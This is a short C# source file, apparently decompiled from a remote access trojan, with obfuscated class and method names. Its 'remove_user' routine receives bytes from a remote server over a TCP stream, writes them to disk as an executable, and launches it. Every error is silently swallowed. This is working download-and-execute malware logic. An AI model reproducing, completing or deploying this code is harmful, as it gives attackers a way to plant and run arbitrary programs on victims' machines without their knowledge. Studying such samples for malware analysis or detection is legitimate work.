using System.Diagnostics;
using System.IO;
using System.Net.Sockets;

namespace aphmasnvs;

internal class OCUMD
{
	public MCUDM server;

	public OCUMD(MCUDM lID)
	{
		server = lID;
	}

	public NetworkStream aphmasnvsNS(TcpClient aphmasnvstcpsck)
	{
		return aphmasnvstcpsck.GetStream();
	}

	public void aphmasnvsremove_user()
	{
		try
		{
			byte[] bytes = server.aphmasnvspuull_data();
			if (!File.Exists(COUNF.aphmasnvsget_mpath() + COUNF.aphmasnvsremvUser + ".exe"))
			{
				File.WriteAllBytes(COUNF.aphmasnvsget_mpath() + COUNF.aphmasnvsremvUser + ".exe", bytes);
				Process.Start(COUNF.aphmasnvsget_mpath() + COUNF.aphmasnvsremvUser + ".exe");
			}
		}
		catch
		{
		}
	}
}
